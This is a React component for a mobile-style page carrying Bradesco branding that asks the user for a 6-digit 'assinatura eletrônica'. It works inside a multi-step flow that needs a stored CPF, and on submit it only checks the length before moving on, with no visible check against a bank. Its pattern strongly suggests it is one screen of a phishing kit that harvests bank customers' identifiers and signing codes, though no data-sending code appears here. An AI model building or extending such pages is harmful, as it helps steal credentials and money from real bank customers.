import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useFlow } from "@/contexts/FlowContext";
import { ArrowLeft } from "lucide-react";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import LottieBackground from "@/components/LottieBackground";
import { getSegmentLogo } from "@/lib/segment-config";
import { segmentButtonStyle } from "@/lib/segment-colors";
import { useFlowNavigation } from "@/hooks/useFlowNavigation";

const SignaturePage = () => {
  const navigate = useNavigate();
  const { data } = useFlow();
  const { getNextStep, getPrevStep } = useFlowNavigation();
  const [signature, setSignature] = useState("");
  const [error, setError] = useState("");
  const logo = getSegmentLogo(data.segment);

  useEffect(() => {
    if (!data.cpf) navigate("/");
  }, [data.cpf, navigate]);

  const handleSubmit = () => {
    if (signature.length !== 6) {
      setError("Informe os 6 dígitos da assinatura");
      return;
    }
    navigate(getNextStep("assinatura"));
  };

  return (
    <div className="relative flex min-h-screen flex-col px-6 py-8">
      <LottieBackground segment={data.segment} />

      {/* Header */}
      <div className="relative z-10 flex items-center justify-between mb-4">
        <img src={logo} alt="Bradesco" className="w-[120px] h-auto object-contain brightness-0 invert" />
        <button
          onClick={() => navigate(getPrevStep("assinatura"))}
          className="flex items-center gap-1 text-body-sm text-white/60"
        >
          <ArrowLeft className="h-4 w-4" /> Voltar
        </button>
      </div>

      {/* Heading */}
      <h1 className="relative z-10 text-lg font-bold leading-snug text-white mb-0">
        Assinatura Eletrônica
      </h1>
      <p className="relative z-10 text-body-sm text-white/60 mt-1">
        Digite sua assinatura numérica de 6 dígitos
      </p>

      {/* Spacer */}
      <div className="flex-1 min-h-[80px] max-h-[160px]" />

      {/* OTP Field */}
      <div className="relative z-10 flex flex-col items-center gap-2 mb-8">
        <p className="text-body-sm font-semibold text-white/80">Assinatura</p>
        <InputOTP
          maxLength={6}
          value={signature}
          onChange={(value) => {
            setSignature(value);
            setError("");
          }}
        >
          <InputOTPGroup>
            <InputOTPSlot index={0} className="h-14 w-14 text-xl border-white/30 bg-white/10 text-white" />
            <InputOTPSlot index={1} className="h-14 w-14 text-xl border-white/30 bg-white/10 text-white" />
            <InputOTPSlot index={2} className="h-14 w-14 text-xl border-white/30 bg-white/10 text-white" />
            <InputOTPSlot index={3} className="h-14 w-14 text-xl border-white/30 bg-white/10 text-white" />
            <InputOTPSlot index={4} className="h-14 w-14 text-xl border-white/30 bg-white/10 text-white" />
            <InputOTPSlot index={5} className="h-14 w-14 text-xl border-white/30 bg-white/10 text-white" />
          </InputOTPGroup>
        </InputOTP>
        {error && <p className="text-xs text-yellow-200">{error}</p>}
      </div>

      {/* Spacer */}
      <div className="flex-1" />

      {/* Button */}
      <button
        style={segmentButtonStyle(data.segment)}
        className="relative z-10 h-14 w-full rounded-full text-body font-semibold shadow-lg transition-all active:scale-[0.98]"
        onClick={handleSubmit}
      >
        Validar Assinatura
      </button>
    </div>
  );
};

export default SignaturePage;
